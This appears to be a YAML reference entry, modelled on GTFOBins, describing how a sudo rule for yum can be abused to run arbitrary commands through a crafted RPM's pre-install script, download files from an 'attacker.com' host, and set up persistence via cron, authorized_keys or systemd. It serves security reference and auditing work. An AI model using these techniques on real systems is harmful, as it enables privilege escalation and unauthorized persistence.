---
name: yum
capabilities:
- exec
- download
required_permissions:
  level: sudo
  notes: Requires sudo rule for this binary.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: yum localinstall -y x-1.0-1.noarch.rpm
  notes: |-
    Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

    ```
    echo /path/to/command >x.sh
    fpm -n x -s dir -t rpm -a all --before-install .x.sh .
    ```
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: yum install http://attacker.com/path/to/input-file.rpm
  notes: The file on the remote host must have the `.rpm` extension, but the content does not have to be an RPM file. The file will be downloaded to a randomly created directory in `/var/tmp/yum-root-xxxxxx/`.
references:
- https://gtfobins.github.io/gtfobins/yum/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
